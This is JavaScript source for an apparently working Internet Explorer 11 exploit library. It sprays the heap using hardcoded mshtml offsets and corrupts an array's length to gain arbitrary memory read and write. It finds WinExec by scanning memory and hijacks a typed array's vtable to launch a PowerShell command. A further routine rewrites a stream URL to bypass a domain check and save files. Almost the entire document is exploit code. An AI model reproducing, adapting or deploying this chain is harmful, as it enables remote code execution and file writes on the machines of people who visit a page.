

ExpLib = (function() {

    function ExpLib( num_arrays, arr_size, base ) {
        this.arr1 = null;
        this.arr2 = null;
        this.base = base;
        this.arr_size = arr_size;
        this.arr_arr = null;

        this.modules = {}
        this.getproc = null;
        this.loadlibrary = null;
        this.mshtml_base = 0x6bcf0000; /* CHANGEME! */

    }

    ExpLib.prototype.resolveAPI = function( modulename, procname ) {
        var module  = this.resolveModule( modulename );

        return this.callAPI( this.getproc, module, this.allocateString(procname) );
    }

    ExpLib.prototype.resolveModule = function( modulename ) {
        if ( this.modules[modulename] )
            return this.modules[modulename]

        var module = this.callAPI( this.loadlibrary, this.allocateString(modulename) );
        this.modules[modulename] = module;
        return module;
    }


    ExpLib.prototype.spray = function() {
        this.arr_arr = new Array( num_arrays );

        var decl = "[";

        for ( var i = 0; i < this.arr_size - 1; ++ i ) {
            decl += '0,';
        }

        decl += '0';
        decl += ']';

        for ( var i = 0; i < num_arrays; ++ i ) {
            this.arr_arr[i] = eval(decl);
            //Following offsets are  11.0.18362.719 mshtml with March patches
            this.arr_arr[i][0] = this.mshtml_base + 0x0463a10; //0x6ea03a10;//0x6c9d3a50 // valid CFG function MSHTML!CFlipAheadTravelEntry::AddRecoveryEntry has a single retn 0x8 instr//eval(decl); offset 0x0463a10
            this.arr_arr[i][2]= this.mshtml_base + 0x002feae0; //0x6e89eae0;//0x6c86eab0 ; //MSHTML!Ptls6::CLsDnodeText::DestroyCore offset 0x002feae0
            this.arr_arr[i][3] = this.base +0x24+ 8; //0x1a1b3024+8; //0x1a1b3024 start of our fake object i.e 'edx' for Ptls6::LsDestroyInternalsInTxtobj
            this.arr_arr[i][4] = this.base + 0xb4 +8; //0x1a1b30b4+8; // +0x4  +0x34 of this points to the 0x90th index
            this.arr_arr[i][5] = 0; // +0x8
            this.arr_arr[i][6] = 0;  // +0xc
            this.arr_arr[i][7] = 0; // +0x10
            this.arr_arr[i][8] = 0;  // +0x14
            this.arr_arr[i][9] = 0;  // +0x18
            this.arr_arr[i][10] = 0;  // +0x1c
            this.arr_arr[i][13] = 0;  // +0x28
            this.arr_arr[i][14] = 0;  // +0x2c
            this.arr_arr[i][0x1f] = this.base+0x20+8;// 0x1a1b3020+8 ;  // points back to the beginning. satisfies the write opertaion in Ptls6::CLsDnodeText::DestroyCore right after we return from Ptls6::LsDestroyInternalsInTxtobj
            this.arr_arr[i][0x64/0x4 +3] = this.base+ 0x2c+8; //0x1a1b302c+8; //0x64 !=0 and a ptr to a writable value(+0x8) this will skip another write into 'ecx+0x38' within Ptls6::LsDestroyInternalsInTxtobj
            this.arr_arr[i][0x68/0x4 +3] = 0;
            this.arr_arr[i][0x80/0x4 +3] = 0x8; //+0x80
            this.arr_arr[i][0x60/0x4 +3] = 0x0; //+0x60 i.e 0x4c + 0x14
            this.arr_arr[i][0x90/0x4 +3] = this.base+ 0x84 +8; //0x1a1b3084+8; //+0x90  this+0x34 points to the value below. this will be the 'ecx' passed to Ptls6::LsDestroyInternalsInTxtobj 
            this.arr_arr[i][0x90/0x4 +4] = this.base+ 0x18; // 0x1a1b3018 //0x1a1b3018 which contains the length(0x3f8) of the array we want to corrupt
        }
    } 

    ExpLib.prototype.setValue = function(i1, i2, v) {
        this.arr_arr[i1][i2] = v;
    }


    ExpLib.prototype.setValueByAddr = function(index, addr, v) {
        this.arr_arr[index][((addr % 0x1000) - 0x20) / 4] = v;
    }

    

    ExpLib.prototype.read32 = function(addr) {
        if ( addr % 4 ) { //unaligned reads error

        }
                
        if ( addr >= this.arr2_member_base ) {
            return this.arr2[(addr - this.arr2_member_base)/4];
        } else {
            return this.arr2[0x40000000 - (this.arr2_member_base - addr)/4]
        }
    }

    ExpLib.prototype.write32 = function(addr, value) {
        if ( addr % 4 ) {
            // error
        }

        if ( value >= 0x80000000 )
            value = -(0x100000000 - value);

        //alert(((addr - this.arr2_member_base)/4).toString(16));
        if ( addr >= this.arr2_member_base ) {
            this.arr2[(addr - this.arr2_member_base)/4] = value;
        } else {
            this.arr2[0x40000000 - (this.arr2_member_base - addr) / 4] = value;
        }
    }
            
    ExpLib.prototype.read8 = function(addr) {
        var value = this.read32( addr  & 0xfffffffc );
        switch ( addr % 4 ) {
            case 0: return (value & 0xff);
            case 1: return ((value >> 8) & 0xff);
            case 2: return ((value >> 16) & 0xff);
            case 3: return ((value >> 24) & 0xff);
        }
                
        return 0;
    }
            
    ExpLib.prototype.write8 = function(addr, value) {
        var original_value = this.read32( addr  & 0xfffffffc );
        var new_value;
                
        switch ( addr % 4 ) {
            case 0:
                new_value = (original_value & 0xffffff00) | (value & 0xff);
                break;

            case 1:
                new_value = (original_value & 0xffff00ff) | ((value & 0xff) << 8);
                break;
            case 2:
                new_value = (original_value & 0xff00ffff) | ((value & 0xff) << 16);
                break;
            case 3:
                new_value = (original_value & 0x00ffffff) | ((value & 0xff) << 24);
                break;
        }
                
                
        this.write32( addr  & 0xfffffffc, new_value );
    }
            

    ExpLib.prototype.writeBytes = function(addr, bytes) {
        for ( var i = 0; i + 3 < bytes.length; i += 4 ) {
            var value = (bytes[i] & 0xff) | ((bytes[i+1] & 0xff) << 8) |
                        ((bytes[i + 2] & 0xff) << 16) | ((bytes[i + 3] & 0xff) << 24);
                                
            this.write32( addr + i, value );
        }
                
        for ( ; i < bytes.length; ++ i ) {
            this.write8( addr + i, bytes[i] );
        }
    }

    ExpLib.prototype.writeString = function(addr, s) {
        var bytes = [];
        var i = 0;
        for ( ; i < s.length; ++ i ) {
            bytes[i] = s.charCodeAt(i);
        }

        bytes[i] = 0;

        this.writeBytes( addr, bytes );
    }

    ExpLib.prototype.writeStringW = function(addr, s) {
        var bytes = [];
        var i = 0;
        for ( ; i < s.length; ++i ) {
            bytes[i * 2] = s.charCodeAt(i);
            bytes[i * 2 + 1] = 0;
        }

        bytes[s.length * 2] = 0;
        bytes[s.length * 2 + 1] = 0;

        this.writeBytes( addr, bytes );
    }
            
    ExpLib.prototype.read16 = function(addr) {
        if ( addr % 2 ) {
                    // error, not aligned
        }
                
        var value = this.read32( addr  & 0xfffffffc );
        switch ( addr % 4 ) {
            case 0: return (value & 0xffff);
            case 1: return ((value >> 8) & 0xffff);
            case 2: return ((value >> 16) & 0xffff);
            case 3: /*not supported*/ break;
        }
                
        return 0;       
    }
            
    ExpLib.prototype.strequal = function(addr, s)  {
        for ( var i = 0; i < s.length; ++ i ) {
            if ( this.read8(addr + i) != s.charCodeAt(i) )
                return false;
        }
                
        return true;
    }
            
            
    ExpLib.prototype.getModuleBase = function(addr) {
                
        var cur_addr = addr;
                
        while ( cur_addr > 0 ) {
                    
            if ( (this.read32(cur_addr) & 0xffff) == 0x5a4d ) {
                return cur_addr;
            }
                    
            cur_addr -= 0x10000;
        }
                
        return 0;
    }
            
            
            
    ExpLib.prototype.getModuleBaseFromIAT = function(base, name) {
        var import_table = base + this.read32( base + this.read32(base + 0x3c) + 0x80 );
        var cur_table = import_table;
                
        while ( cur_table < import_table + 0x1000 ) {
                    
            var name_addr = base + this.read32(cur_table + 12);
            if ( this.strequal( name_addr, name ) ) {
                var iat = base + this.read32(cur_table + 16);
                var func = this.read32(iat);
                while ( 0 == func ) { 
                    iat += 4;
                    func = this.read32(iat);
                }
                        
                return this.getModuleBase( func & 0xFFFF0000 );
                        
            }
                    
            cur_table += 20;
        }
                
        return 0;
    }
            
    ExpLib.prototype.getProcAddress = function(base, procname)  {
        var export_table = base + this.read32( base + this.read32(base + 0x3c) + 0x78 );
        var num_functions = this.read32( export_table + 20 );
        var addr_functions = base + this.read32( export_table + 28 );
        var addr_names = base + this.read32( export_table + 32 );
        var addr_ordinals = base + this.read32( export_table + 36 );
                
        for ( var i = 0; i < num_functions; ++ i ) {
            var name_addr = this.read32( addr_names + i * 4 ) + base;
            if ( this.strequal( name_addr, procname ) ) {
                var ordinal = this.read16( addr_ordinals + i * 2 );
                var result = this.read32( addr_functions + ordinal * 4 ) + base;
                return result;
            }
        }
                
        return 0;
    }
            
    ExpLib.prototype.searchBytes = function(pattern, start, end)  {
                
        if ( start >= end || start + pattern.length > end )
            return 0;
                
        var pos = start;
        while ( pos < end ) {
            for ( var i = 0; i < pattern.length; ++ i ) {
                if ( this.read8(pos + i) != pattern[i] )
                    break;
            }
                    
            if ( i == pattern.length ) {
                return pos;
            }
                    
            ++ pos;
        }
                
        return 0;
    }


    ExpLib.prototype.getError = function(msg) {
        return this.err_msg;
    }

    ExpLib.prototype.setError = function(msg) {
        this.err_msg = msg;
    }

    ExpLib.prototype.memcpy = function(dst, src, size) {
        var i = 0;
        for ( ; i < size - 4; i += 4 ) {
            this.write32( dst + i, this.read32(src + i) );
        }

        for ( ; i < size; ++ i ) {
            this.write8( dst + i, this.read8(src + i) );
        }
    }

    ExpLib.prototype.JsEnumerateHeap =function (addr) {
        var sum = 0;
        var hash = -85368223; //-0x5169d9f
        while(true){
            for(var i = 0; i < 5; i++) //read first 5 dwords,i.e 20 bytes and hash them
            {
                data = this.read32(addr + i * 4);
                sum = (sum + data) & 0xFFFFFFFF;
            }
            if(sum == hash)
            {
                return addr;
            }
            else
            {
                addr++;
            }
        
        }
        return 0;
    }   


    ExpLib.prototype.findkernel32 =function (addr) {
        var bytes = 0;
        var import_table=0;
        while(true)
            {
                bytes = this.read32(addr)
                if ((bytes & 0xFFFF)==0x15ff){ //Found call  via the import table  dword ptr [jscript9!_imp__TlsGetValue]!
                    addr=addr+2;
                    var import_table_byte_0 = this.read8(addr); //unaligned reads are handled by read8
                    var import_table_byte_1 = this.read8(addr+1);
                    var import_table_byte_2 = this.read8(addr+2);
                    var import_table_byte_3 = this.read8(addr+3);
                    var import_table = (import_table_byte_0*1) + (import_table_byte_1 *0x100) + (import_table_byte_2*0x10000) + (import_table_byte_3*0x1000000);
                    break;

                }
                else if (bytes ==0x0004c2c9){ //if we reached the end of the function i.e leave, ret 0x4 quit
                    return 0;
                }
                else{
                    addr+=4;
                }
            }
            
            var kernel32_TlsGetValueStub= this.read32(import_table) ; //KERNEL32!TlsGetValueStub
            return kernel32_TlsGetValueStub;


    }

            
    ExpLib.prototype.findwinexec =function (addr) {
        var sum = 0;
        var hash1 = -2076540041; 
        var hash2 =  -337063464;
        while(true){
            for(var i = 0; i < 2; i++) //read first 2 dwords,hash1. if match then proceed to next hash  
            {
                data = this.read32(addr + i * 4);
                sum = (sum + data) & 0xFFFFFFFF;
            }
            if (sum == hash1){
                skip_addr= addr+8+12;
                sum=0;

                for(i = 0; i < 8; i++) //skip 12 bytes then read next 8 dwords,hash2. 
                    {
                    data = this.read32(skip_addr + i * 4);
                    sum = (sum + data) & 0xFFFFFFFF;
                    }
                if(sum == hash2)
                    {
                    return addr;
                    }
            }
            else
            {
                addr++;
            }
        
        }
    return 0;
    }   



    ExpLib.prototype.go = function() {
        var i = 0;

        for ( ; i < this.arr_arr.length - 1; ++ i ) {
            this.arr_arr[i][this.arr_size + 0x1c / 4] = 0;

            if ( this.arr_arr[i][this.arr_size + 0x18 / 4] == this.arr_size ) {
                this.arr_arr[i][this.arr_size + 0x14 / 4] = 0x3fffffff;
                this.arr_arr[i][this.arr_size + 0x18 / 4] = 0x3fffffff;

                this.arr_arr[i + 1].length = 0x3fffffff;

                if ( this.arr_arr[i+1].length == 0x3fffffff )
                    break;
            }       

        }
            
        if ( i >= this.arr_arr.length - 1 ) {
            this.setError( "Cannot find array with corrupt length!" );
            return false;
        }

        while(1){
        this.arr1_idx = i;
        this.arr2_idx = i + 1;  

        this.arr1 = this.arr_arr[i];    
        this.arr2 = this.arr_arr[i + 1];

        this.arr2_base = this.base + 0x1000;
        this.arr2_member_base = this.arr2_base + 0x20;

        var target_arr = new Uint8Array(0x100);
        var target_arr_addr =  this.leakAddress(target_arr);
        var target_arr_buffer = this.read32(target_arr_addr +0x20);
        var target_arr_vftable = this.read32(target_arr_addr);
        var jscript9_base =  target_arr_vftable & 0xffff0000 ; 
        //alert(target_arr_vftable.toString(16));
        var JsEnumerateHeap_address = this.JsEnumerateHeap(this.read32(target_arr_vftable)+0x100000); //first dword within the vftable is jscript9!HostDispatch::AddToPrototype. start searching from an offset of 0x100000 for JsEnumerateHeap
        //alert(JsEnumerateHeap_address.toString(16));
        var kernel32_TlsGetValueStub = this.findkernel32(JsEnumerateHeap_address);
        //alert(kernel32_TlsGetValueStub.toString(16));
        var winexec = this.findwinexec(kernel32_TlsGetValueStub);
        //alert(winexec.toString(16));

        this.memcpy(this.base + 0x120 /*0x1a1b3120*/,target_arr_vftable,0x200); //copy 0x200 bytes from the original vftable to the fake vftable pointer 0x1a1b3120
        this.write32(this.base+0x120+0x188 /*0x1a1b3120+0x188*/, winexec); //change fake_vtable + 0x188 to point to winexec instead of jscript9!Js::TypedArray<unsigned char,0>::Subarray
        this.write32(target_arr_addr,this.base+0x120/*0x1a1b3120*/); //modify vtable of target array to our fake_vtable
        this.write32(target_arr_addr+0x1c, 0x7fffff00); //increase the size at typearray_view + 0x1c so that we can specify arbitrary indexes as arguments in subarray
        this.writeString(target_arr_buffer, "powershell.exe -Command \"Start-Process notepad\"") //LPCSTR lpCmdLine  to WinExec
        target_arr.subarray(target_arr_buffer, 0x5); // WinExec(LPCSTR lpCmdLine,UINT   uCmdShow); //note that the second argument actually doesnt get passed as is because of checks in jscript9!Js::TypedArray<unsigned char,0>::Subarray
        this.write32(target_arr_addr,target_arr_vftable); // cleanup/restore vtable of target array]
        return true; 
        
        }


    }

    ExpLib.prototype.leakAddress = function(obj) {
        this.arr_arr[this.arr2_idx + 1][2] = obj;
        return this.read32(this.arr2_member_base + 0x1008);
    }


    ExpLib.prototype.saveToFile = function(stream, filename) {
    
        var obj = this.leakAddress(stream);
        var stream_obj = this.read32(obj + 0x30);
        var url_addr = this.read32(stream_obj + 0x3c);

        //alert(url_addr.toString(16));
        
        /*
        * bypass domain check
        */
        this.writeStringW( url_addr, 'file:///C:/1.htm' )

        stream.SaveToFile(filename, 2);
    }



    

    return ExpLib;

})();
